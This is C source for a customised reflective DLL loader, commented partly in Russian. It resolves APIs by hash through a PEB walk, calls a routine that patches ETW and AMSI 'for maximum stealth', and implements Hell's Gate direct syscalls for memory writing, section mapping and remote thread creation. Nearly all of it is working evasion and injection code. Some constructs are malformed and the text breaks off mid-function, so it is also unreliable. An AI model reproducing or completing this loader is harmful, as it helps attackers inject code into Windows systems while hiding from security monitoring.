//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
//       conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
//       conditions and the following disclaimer in the documentation and/or other materials 
//       provided with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
//       endorse or promote products derived from this software without specific prior written 
//       permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <winternl.h> // Include for UNICODE_STRING, PEB, LDR_DATA etc.
#include <stdio.h> // Для printf (если используется для отладки)

// Перемещено сюда: Определение SECTION_INHERIT, если оно не найдено. Значение 2 (стандартное для WinAPI)
#ifndef SECTION_INHERIT
#define SECTION_INHERIT 2
#endif

// Перемещено сюда: Прототип функции, чтобы избежать implicit declaration warning
void PatchETWandAMSI(void);

//===============================================================================================//
// Purposely taken from public sources as to make this code detached from the Metasploit Framework //
//===============================================================================================//
// Example DllMain function for a reflective DLL (rename/replace this with your own DllMain)
// This function is required for the reflective loader to work correctly.
// Ensure your actual payload DLL also has a DllMain function.
/*
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason )
    {
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *(HMODULE *)lpReserved = hinstDLL;
            break;
		case DLL_PROCESS_ATTACH:
			//MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll", MB_OK );
			break;
		case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
*/

//===============================================================================================//
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
// Load a DLL via LoadRemoteLibraryR. This is used when injecting a reflective DLL via
// the LoadRemoteLibraryR function. This function assumes the start address of this 
// function is located at the start of the DLL's DOS header.
// N.B. You must compile this function then patch the DLL's DOS header with the address
//      of this function. The CFF explorer has a script to do this patching automatically.
// N.B. This function does not support loading forwarded exports.
__declspec(dllexport) BOOL WINAPI LoadRemoteLibraryR( LPVOID lpBuffer, DWORD dwLength )
{
	// check if the library has been loaded already...
	if( lpBuffer == NULL || dwLength == 0 )
		return FALSE;

	return TRUE;
}
#endif
//===============================================================================================//
#ifdef REFLECTIVEDLLINJECTION_VIA_REFLECTIVELOADER
// This is the reflective loader function. This function is responsible for loading the DLL
// from memory into its own address space. It resolves imports, relocations, and then calls
// the DLL's entry point (DllMain).
// N.B. Make sure this function is exported from the DLL. The typical export name is "ReflectiveLoader".
// N.B. This function must be compiled as position independent code (e.g., /PIC or /pie).

// Structure definitions for PE parsing (if not using standard windows.h definitions fully)
// These are often redefined within reflective loaders to avoid reliance on potentially hooked APIs
// or to ensure compatibility across different Windows versions where struct sizes might change.
// However, for simplicity and using standard headers, we might rely on windows.h definitions.

#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)

// Define PEB structures (simplified versions, ensure architecture correctness)
// REMOVED: Duplicate struct definitions previously here, now included via <winternl.h>

// Function pointer types for required API functions
typedef HMODULE (WINAPI * LOADLIBRARYA)( LPCSTR );
typedef FARPROC (WINAPI * GETPROCADDRESS)( HMODULE, LPCSTR );
typedef LPVOID  (WINAPI * VIRTUALALLOC)( LPVOID, SIZE_T, DWORD, DWORD );
typedef DWORD   (WINAPI * GETLASTERROR)( VOID );
typedef BOOL    (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );

#define KERNEL32DLL_HASH   0x6A4ABC5B // Hash for kernel32.dll
#define NTDLLDLL_HASH      0x3CFA685D // Hash for ntdll.dll
#define LOADLIBRARYA_HASH  0xEC0E4E8E // Hash for LoadLibraryA
#define GETPROCADDRESS_HASH 0x7C0DFCAA // Hash for GetProcAddress
#define VIRTUALALLOC_HASH  0x91AFCA54 // Hash for VirtualAlloc

// Simple hash function for API resolving (example)
DWORD dwGetHash( char * cApiName )
{
    DWORD dwHash = 0;
    while( *cApiName )
    {
        dwHash = ( ( dwHash << 13 ) | ( dwHash >> 19 ) ) + *cApiName;
        cApiName++;
    }
    return dwHash;
}

// Удаляю все обращения к winternl.h-структурам, работаю только с кастомными структурами и offset-ами
HMODULE GetModuleBaseByHash(DWORD dwModuleHash)
{
    PPEB_MIN pPeb = NULL;
    PLIST_ENTRY pListHead = NULL;
    PLIST_ENTRY pListEntry = NULL;
    
#if defined(_WIN64)
    pPeb = (PPEB_MIN)__readgsqword(0x60);
#else // _WIN32
    pPeb = (PPEB_MIN)__readfsdword(0x30);
#endif

    if (!pPeb || !pPeb->Ldr || !pPeb->Ldr->InMemoryOrderModuleList.Flink) {
        return NULL;
    }

    pListHead = &pPeb->Ldr->InMemoryOrderModuleList;
    pListEntry = pListHead->Flink;

    while (pListEntry != pListHead)
    {
        // LDR_DATA_TABLE_ENTRY кастим вручную
        BYTE* pLdrEntry = (BYTE*)pListEntry;
        // Получаем BaseDllName через offset
        UNICODE_STRING* pBaseDllName = GET_BASEDLLNAME(pLdrEntry);
        if (pBaseDllName && pBaseDllName->Buffer && pBaseDllName->Length > 0)
        {
            char szModuleName[MAX_PATH];
            int i = 0;
            while (i < (pBaseDllName->Length / sizeof(WCHAR)) && i < MAX_PATH - 1)
            {
                WCHAR wc = pBaseDllName->Buffer[i];
                if (wc >= 'A' && wc <= 'Z')
                    szModuleName[i] = (char)(wc + ('a' - 'A'));
                else
                    szModuleName[i] = (char)wc;
                i++;
            }
            szModuleName[i] = '\0';
            if (dwGetHash(szModuleName) == dwModuleHash)
            {
                // DllBase всегда по offset 0x30 (x64) или 0x18 (x86) — сверить по структуре, но для большинства билдов так
#if defined(_WIN64)
                PVOID DllBase = *(PVOID*)(pLdrEntry + 0x30);
#else
                PVOID DllBase = *(PVOID*)(pLdrEntry + 0x18);
#endif
                return (HMODULE)DllBase;
            }
        }
        // InMemoryOrderLinks всегда первый
        pListEntry = *(PLIST_ENTRY*)pLdrEntry;
    }
    return NULL;
}

// Find the address of an exported function by hash
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwProcHash)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDir = NULL;
    PDWORD pdwFunctions = NULL;
    PDWORD pdwNames = NULL;
    PWORD pwOrdinals = NULL;
    DWORD i = 0;

    if (!hModule) return NULL;

    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pExportDir || !pExportDir->NumberOfFunctions) return NULL;

    pdwFunctions = (PDWORD)((LPBYTE)hModule + pExportDir->AddressOfFunctions);
    pdwNames = (PDWORD)((LPBYTE)hModule + pExportDir->AddressOfNames);
    pwOrdinals = (PWORD)((LPBYTE)hModule + pExportDir->AddressOfNameOrdinals);

    // Search by name hash
    for (i = 0; i < pExportDir->NumberOfNames; i++)
    {
        char* szName = (char*)((LPBYTE)hModule + pdwNames[i]);
        if (dwGetHash(szName) == dwProcHash)
        {
            return (FARPROC)((LPBYTE)hModule + pdwFunctions[pwOrdinals[i]]);
        }
    }
    
    // Function not found by name hash
    return NULL;
}

// Прототип функции, чтобы избежать implicit declaration warning
void PatchETWandAMSI(void);

// Определение SECTION_INHERIT, если оно не найдено. Значение 2 (стандартное для WinAPI)
#ifndef SECTION_INHERIT
#define SECTION_INHERIT 2
#endif

__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
{
	// Function pointers resolved dynamically
	LOADLIBRARYA pLoadLibraryA             = NULL;
	GETPROCADDRESS pGetProcAddress           = NULL;
	VIRTUALALLOC pVirtualAlloc             = NULL;
	DLLMAIN pDllMain                      = NULL;

	// Module and PE header pointers
	HMODULE hKernel32                     = NULL;
	PPEB pPeb                             = NULL;
	ULONG_PTR uiLibraryAddress            = 0;
	ULONG_PTR uiBaseAddress                = 0;
	PIMAGE_DOS_HEADER pDosHeader            = NULL;
	PIMAGE_NT_HEADERS pNtHeaders            = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader    = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc   = NULL;
	PIMAGE_THUNK_DATA pThunkData            = NULL;
	PIMAGE_BASE_RELOCATION pBaseReloc      = NULL;
	PIMAGE_IMPORT_BY_NAME pImportByName     = NULL;

	// Variables for loops and calculations
	DWORD i                             = 0;
	DWORD dwModuleHash                 = 0;
	DWORD dwFunctionHash               = 0;
	ULONG_PTR uiValueA                  = 0;
	ULONG_PTR uiValueB                  = 0;
	ULONG_PTR uiValueC                  = 0;
    DWORD dwProtect                    = 0;
    ULONG_PTR uiRelocPlaceholder       = 0;
    DWORD dwNumberOfRelocations        = 0;
    WORD wRelocType                   = 0;
    PWORD pwRelocEntry                 = NULL;

    // STEP 1: Find the base address of kernel32.dll and resolve required API functions.

    // Get the base address of the currently executing image (our DLL)
    uiLibraryAddress = caller();

    // Find kernel32.dll base address using PEB traversal (more stealthy than GetModuleHandle)
    hKernel32 = GetModuleBaseByHash(KERNEL32DLL_HASH);
    if (!hKernel32) {
        // Fallback or error handling if GetModuleBaseByHash fails
        // For simplicity, we might just exit or try another method.
        // ExitThread(1); // Or some other error indication
        return 1;
    }

    // Resolve required functions using hashes
    pLoadLibraryA  = (LOADLIBRARYA)(void*)GetProcAddressByHash(hKernel32, LOADLIBRARYA_HASH);
    pGetProcAddress = (GETPROCADDRESS)(void*)GetProcAddressByHash(hKernel32, GETPROCADDRESS_HASH);
    pVirtualAlloc  = (VIRTUALALLOC)(void*)GetProcAddressByHash(hKernel32, VIRTUALALLOC_HASH);

    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc) {
        // Critical functions not found, cannot proceed
        // ExitThread(2);
        return 2;
    }

    // STEP 2: Calculate the base address of the DLL image in memory.
    // The stager passes the base address of the *allocated* memory block as lpParameter.
    // However, ReflectiveLoader often assumes it's running from the *original* location
    // first to find its own headers. We need the base address of the DLL image as it was
    // loaded by the stager (the value passed in lpParameter).
    uiBaseAddress = (ULONG_PTR)lpParameter;

    // STEP 3: Parse PE headers of the DLL.
    pDosHeader = (PIMAGE_DOS_HEADER)uiBaseAddress;
    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + pDosHeader->e_lfanew);

    // STEP 4: Process Import Address Table (IAT).
    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(uiBaseAddress + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Loop through each imported module descriptor
    while (pImportDesc->Name)
    {
        // Get the name of the imported module
        char * szModuleName = (char *)(uiBaseAddress + pImportDesc->Name);
        
        // Load the imported module
        HINSTANCE hModule = pLoadLibraryA(szModuleName);
        if (hModule)
        {
            // Get pointers to the OriginalFirstThunk and FirstThunk
            PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(uiBaseAddress + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(uiBaseAddress + pImportDesc->FirstThunk);

            // Loop through each imported function in the thunk
            while (DEREF_32(pOriginalFirstThunk)) // Check OriginalFirstThunk content
            {
                // Check if importing by ordinal
                if (pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                {
                    // Import by ordinal
                    ULONG_PTR FunctionAddress = (ULONG_PTR)pGetProcAddress(hModule, (LPCSTR)(pOriginalFirstThunk->u1.Ordinal & 0xFFFF));
                    
                    // Check for failure (forwarded exports might cause issues here)
                    if (!FunctionAddress)
                    {
                        // TODO: Handle error - function not found by ordinal
                        // ExitThread(3);
                        return 3; // Indicate error
                    }
                    
                    // Patch the IAT (FirstThunk) with the resolved address
                    *(ULONG_PTR *)pFirstThunk = FunctionAddress;
                }
                else
                {
                    // Import by name
                    pImportByName = (PIMAGE_IMPORT_BY_NAME)(uiBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
                    ULONG_PTR FunctionAddress = (ULONG_PTR)pGetProcAddress(hModule, pImportByName->Name);

                    // Check for failure
                    if (!FunctionAddress)
                    {
                        // TODO: Handle error - function not found by name
                        // ExitThread(4);
                         return 4; // Indicate error
                    }

                    // Patch the IAT (FirstThunk) with the resolved address
                    *(ULONG_PTR *)pFirstThunk = FunctionAddress;
                }
                // Move to the next thunk entry
                pOriginalFirstThunk++;
                pFirstThunk++;
            }
        }
        else
        {
            // TODO: Handle error - dependent DLL failed to load
            // ExitThread(5);
             return 5; // Indicate error
        }
        // Move to the next import descriptor
        pImportDesc++;
    }

    // STEP 5: Process Base Relocations.
    // The stager should have allocated memory at the preferred base address if possible.
    // If not, or if ASLR is active, relocations are needed.
    // Check if relocations are required
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
    {
        // Calculate the difference between the preferred base and the actual base
        ULONG_PTR delta = uiBaseAddress - pNtHeaders->OptionalHeader.ImageBase;

        // Get the first relocation block
        pBaseReloc = (PIMAGE_BASE_RELOCATION)(uiBaseAddress + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        // Loop through all relocation blocks
        while (pBaseReloc->VirtualAddress)
        {
            // Calculate the number of relocations in this block
            dwNumberOfRelocations = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            pwRelocEntry = (PWORD)((ULONG_PTR)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION));

            // Loop through each relocation entry in the block
            for (i = 0; i < dwNumberOfRelocations; i++, pwRelocEntry++)
            {
                // Get the type of relocation
                wRelocType = *pwRelocEntry >> 12;
                
                // Skip entries that don't need processing
                if (wRelocType == IMAGE_REL_BASED_ABSOLUTE) continue;

                // Get the address to relocate
                uiRelocPlaceholder = uiBaseAddress + pBaseReloc->VirtualAddress + (*pwRelocEntry & 0xFFF);

                // Apply the relocation based on type (only handle common types for x86/x64)
                if (wRelocType == IMAGE_REL_BASED_HIGHLOW || wRelocType == IMAGE_REL_BASED_DIR64)
                {
                    *((ULONG_PTR *)uiRelocPlaceholder) += delta;
                }
                // Add other relocation types if needed (e.g., HIGH, LOW)
            }

            // Move to the next relocation block
            pBaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pBaseReloc + pBaseReloc->SizeOfBlock);
        }
    }

    // STEP 5.1: Патчим ETW и AMSI перед вызовом DllMain для максимальной скрытности
    PatchETWandAMSI();

    // STEP 6: Call the DLL's entry point (DllMain).
    pDllMain = (DLLMAIN)(uiBaseAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    
    // Call DllMain with DLL_PROCESS_ATTACH
    // Pass the base address (hinstDLL) and the reason
    pDllMain((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter); // lpParameter could be NULL or context from CreateThread

    // STEP 7: Return control (or potentially stay resident).
    // The standard ReflectiveLoader typically returns here. The DLL's DllMain 
    // or threads created by it are now responsible for execution.

	return 0; // Indicate success
}
#endif
//===============================================================================================//
// This function is required by the loader
ULONG_PTR caller( VOID )
{
	return (ULONG_PTR)_ReturnAddress();
}
//===============================================================================================//
// --- HellsGate Implementation ---

// Hashes for anchor syscalls (can use others, these are common)
#define NtAllocateVirtualMemory_HASH 0x6793C34C
#define NtProtectVirtualMemory_HASH  0x082962C8 // Corrected hash value
// Add hashes for other needed syscalls
#define NtWriteVirtualMemory_HASH    0x95F3A792
#define NtMapViewOfSection_HASH      0x231F196A
#define NtCreateThreadEx_HASH        0xCB0C2130
#define NtUnmapViewOfSection_HASH    0x595014AD
#define NtQueryInformationProcess_HASH 0x10F8132F // ДОБАВЛЕНО

// Structure to hold export information
typedef struct _EXPORT_ENTRY {
    ULONG_PTR pAddress;
    DWORD dwHash;
} EXPORT_ENTRY, *PEXPORT_ENTRY;

// Helper structure for HellsGate context
typedef struct _HELLSGATE_CONTEXT {
    PEXPORT_ENTRY pExports;
    DWORD dwNumberOfExports;
    HMODULE hNtdll;
    BOOL bInitialized;
    DWORD dwFirstSyscallNumber; // Syscall number of the first validated function in the sorted list
    ULONG_PTR pFirstSyscallAddress; // Address of the first validated function
} HELLSGATE_CONTEXT, *PHELLSGATE_CONTEXT;

// Global context for HellsGate (or pass it around)
HELLSGATE_CONTEXT g_HellsGateContext = { 0 };

// Comparison function for qsort
int CompareExportEntries(const void* a, const void* b) {
    PEXPORT_ENTRY entryA = (PEXPORT_ENTRY)a;
    PEXPORT_ENTRY entryB = (PEXPORT_ENTRY)b;
    if (entryA->pAddress < entryB->pAddress) return -1;
    if (entryA->pAddress > entryB->pAddress) return 1;
    return 0;
}

// Function to parse NTDLL EAT and initialize HellsGate context
BOOL InitializeHellsGate()
{
    if (g_HellsGateContext.bInitialized) return TRUE;

    g_HellsGateContext.hNtdll = GetModuleBaseByHash(NTDLLDLL_HASH);
    if (!g_HellsGateContext.hNtdll) return FALSE;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)g_HellsGateContext.hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)g_HellsGateContext.hNtdll + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)g_HellsGateContext.hNtdll + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!pExportDir || !pExportDir->NumberOfNames || !pExportDir->AddressOfNames || !pExportDir->AddressOfFunctions || !pExportDir->AddressOfNameOrdinals) {
        return FALSE;
    }

    PDWORD pdwFunctions = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfFunctions);
    PDWORD pdwNames = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNames);
    PWORD pwOrdinals = (PWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNameOrdinals);

    g_HellsGateContext.dwNumberOfExports = pExportDir->NumberOfNames; // Use NumberOfNames for consistency
    // Allocate memory for exports (consider VirtualAlloc for stealth)
    g_HellsGateContext.pExports = (PEXPORT_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_HellsGateContext.dwNumberOfExports * sizeof(EXPORT_ENTRY));
    if (!g_HellsGateContext.pExports) return FALSE;

    DWORD dwValidExports = 0;
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* szName = (char*)((LPBYTE)g_HellsGateContext.hNtdll + pdwNames[i]);
        if (szName) {
            ULONG_PTR pFuncAddress = (ULONG_PTR)((LPBYTE)g_HellsGateContext.hNtdll + pdwFunctions[pwOrdinals[i]]);
            // Basic check: only consider functions starting with 'Nt' or 'Zw' (likely syscalls)
            if (strncmp(szName, "Nt", 2) == 0 || strncmp(szName, "Zw", 2) == 0) {
                 g_HellsGateContext.pExports[dwValidExports].pAddress = pFuncAddress;
                 g_HellsGateContext.pExports[dwValidExports].dwHash = dwGetHash(szName); // Use existing hash function
                 dwValidExports++;
            }
        }
    }
     g_HellsGateContext.dwNumberOfExports = dwValidExports; // Update count to actual syscalls found

    // Sort exports by address
    qsort(g_HellsGateContext.pExports, g_HellsGateContext.dwNumberOfExports, sizeof(EXPORT_ENTRY), CompareExportEntries);

    // --- Find the Gate ---
    // Look for adjacent NtAllocateVirtualMemory and NtProtectVirtualMemory
    DWORD dwSyscallNum1 = 0xFFFFFFFF, dwSyscallNum2 = 0xFFFFFFFF;
    ULONG_PTR pAddr1 = 0, pAddr2 = 0;

    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports -1; i++) { // Iterate up to second-to-last
         // Check if the current and next functions have the expected 'syscall' pattern
         // This is a simplified check, real implementations are more robust
         // Look for mov eax, imm32 (B8) followed by syscall (0F 05) or sysenter (0F 34)
         // Pattern for x64: 4C 8B D1    mov r10, rcx
         //                  B8 xx xx xx xx mov eax, syscall_num
         //                  0F 05       syscall
         //                  C3          ret
         BYTE* pFuncBytes1 = (BYTE*)g_HellsGateContext.pExports[i].pAddress;
         BYTE* pFuncBytes2 = (BYTE*)g_HellsGateContext.pExports[i+1].pAddress;

         // Basic check for x64 mov eax, imm32 pattern
         if (pFuncBytes1[0] == 0x4C && pFuncBytes1[1] == 0x8B && pFuncBytes1[2] == 0xD1 && // mov r10, rcx
             pFuncBytes1[3] == 0xB8 && // mov eax
             pFuncBytes1[8] == 0x0F && pFuncBytes1[9] == 0x05 && // syscall
             pFuncBytes1[10] == 0xC3 && // ret
             pFuncBytes2[0] == 0x4C && pFuncBytes2[1] == 0x8B && pFuncBytes2[2] == 0xD1 && // mov r10, rcx
             pFuncBytes2[3] == 0xB8 && // mov eax
             pFuncBytes2[8] == 0x0F && pFuncBytes2[9] == 0x05 && // syscall
             pFuncBytes2[10] == 0xC3)   // ret
         {
               dwSyscallNum1 = *(DWORD*)(pFuncBytes1 + 4); // Get syscall number from mov eax, imm32
               dwSyscallNum2 = *(DWORD*)(pFuncBytes2 + 4);

               // Check if they are sequential
               if (dwSyscallNum2 == dwSyscallNum1 + 1) {
                     g_HellsGateContext.pFirstSyscallAddress = g_HellsGateContext.pExports[i].pAddress;
                     g_HellsGateContext.dwFirstSyscallNumber = dwSyscallNum1;
                     g_HellsGateContext.bInitialized = TRUE;
                     // Optionally free memory used for export names if not needed anymore
                     // HeapFree(...) or VirtualFree(...)
                     return TRUE; // Gate found!
               }
         }
    }

    // Gate not found - cleanup and return error
    HeapFree(GetProcessHeap(), 0, g_HellsGateContext.pExports);
    g_HellsGateContext.pExports = NULL;
    g_HellsGateContext.dwNumberOfExports = 0;
    return FALSE;
}

// Function to get syscall number using HellsGate
DWORD GetSyscallNumberByHashHellsGate(DWORD dwFunctionHash)
{
    if (!g_HellsGateContext.bInitialized) {
        if (!InitializeHellsGate()) {
            return 0xFFFFFFFF; // Indicate error
        }
    }

    // Find the target function in the sorted list
    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports; i++) {
        if (g_HellsGateContext.pExports[i].dwHash == dwFunctionHash) {
            // Calculate the syscall number based on its position relative to the first validated syscall
            DWORD dwTargetSyscallNumber = g_HellsGateContext.dwFirstSyscallNumber + (DWORD)(g_HellsGateContext.pExports[i].pAddress - g_HellsGateContext.pFirstSyscallAddress) / 0x20; // Approximation: assume ~32 bytes per syscall stub

             // More accurate calculation: Find the index of the first syscall and the target syscall
             DWORD firstSyscallIndex = 0xFFFFFFFF;
             DWORD targetIndex = 0xFFFFFFFF;
             for(DWORD j=0; j<g_HellsGateContext.dwNumberOfExports; ++j){
                 if(g_HellsGateContext.pExports[j].pAddress == g_HellsGateContext.pFirstSyscallAddress){
                     firstSyscallIndex = j;
                 }
                 if(g_HellsGateContext.pExports[j].dwHash == dwFunctionHash){
                     targetIndex = j;
                 }
                 if(firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF){
                     break;
                 }
             }

             if(firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF){
                return g_HellsGateContext.dwFirstSyscallNumber + (targetIndex - firstSyscallIndex);
             } else {
                 return 0xFFFFFFFF; // Target or first syscall index not found
             }
        }
    }

    return 0xFFFFFFFF; // Target hash not found
}

// --- End HellsGate Implementation ---

// Изменена функция DirectSyscall_NtWriteVirtualMemory под GCC __asm__ volatile
__declspec(naked) NTSTATUS DirectSyscall_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtWriteVirtualMemory_HASH);
    if (syscallNumber == 0xFFFFFFFF) {
        __asm__ volatile (
            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
            "ret\n"
            : : : "eax" // Clobber eax
        );
    }

    __asm__ volatile (
        "mov %0, %%eax\n\t"      // Загрузить номер syscall в EAX
        "mov %%rcx, %%r10\n\t"   // mov r10, rcx (стандартный пролог syscall в x64)
        "syscall\n\t"            // Выполнить syscall
        "ret\n"                   // Вернуться из функции
        :                          // Output operands (none)
        : "r"(syscallNumber)       // Input operands: syscallNumber в регистр
        : "%rax", "%r10", "%rcx", "memory" // Clobbered registers + memory
    );
}

// Изменена функция DirectSyscall_NtMapViewOfSection под GCC __asm__ volatile
__declspec(naked) NTSTATUS DirectSyscall_NtMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    // Локальное определение SECTION_INHERIT, если не определено
    #ifndef SECTION_INHERIT
    #define SECTION_INHERIT 2
    #endif
    SECTION_INHERIT InheritDisposition, 
    ULONG AllocationType,
    ULONG Win32Protect)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtMapViewOfSection_HASH);
     if (syscallNumber == 0xFFFFFFFF) {
        __asm__ volatile (
            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
            "ret\n"
            : : : "eax"
        );
    }

     __asm__ volatile (
        "mov %0, %%eax\n\t"
        "mov %%rcx, %%r10\n\t"
        "syscall\n\t"
        "ret\n"
        :
        : "r"(syscallNumber)
        : "%rax", "%r10", "%rcx", "memory"
    );
}

// Изменена функция DirectSyscall_NtCreateThreadEx под GCC __asm__ volatile
__declspec(naked) NTSTATUS DirectSyscall_NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes, // POBJECT_ATTRIBUTES
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE
    IN PVOID Argument,
    IN ULONG CreateFlags, // THREAD_CREATE_FLAGS
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList // PPS_ATTRIBUTE_LIST
    )
{
     DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtCreateThreadEx_HASH);
     if (syscallNumber == 0xFFFFFFFF) {
         __asm__ volatile (
            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
            "ret\n"
            : : : "eax"
        );
     }

    __asm__ volatile (
        "mov %0, %%eax\n\t"
        "mov %%rcx, %%r10\n\t"
        "syscall\n\t"
        "ret\n"
        :
        : "r"(syscallNumber)
        : "%rax", "%r10", "%rcx", "memory"
    );
}

// Изменена функция DirectSyscall_NtUnmapViewOfSection под GCC __asm__ volatile
__declspec(naked) NTSTATUS DirectSyscall_NtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress
)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtUnmapViewOfSection_HASH);
     if (syscallNumber == 0xFFFFFFFF) {
        __asm__ volatile (
            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
            "ret\n"
            : : : "eax"
        );
    }

    __asm__ volatile (
        "mov %0, %%eax\n\t"
        "mov %%rcx, %%r10\n\t"
        "syscall\n\t"
        "ret\n"
        :
        : "r"(syscallNumber)
        : "%rax", "%r10", "%rcx", "memory"
    );
}

// Изменена функция DirectSyscall_NtQueryInformationProcess под GCC __asm__ volatile
__declspec(naked) NTSTATUS DirectSyscall_NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength OPTIONAL)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtQueryInformationProcess_HASH);
    if (syscallNumber == 0xFFFFFFFF) {
        __asm__ volatile (
            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
            "ret\n"
            : : : "eax"
        );
    }

    __asm__ volatile (
        "mov %0, %%eax\n\t"
        "mov %%rcx, %%r10\n\t"
        "syscall\n\t"
        "ret\n"
        :
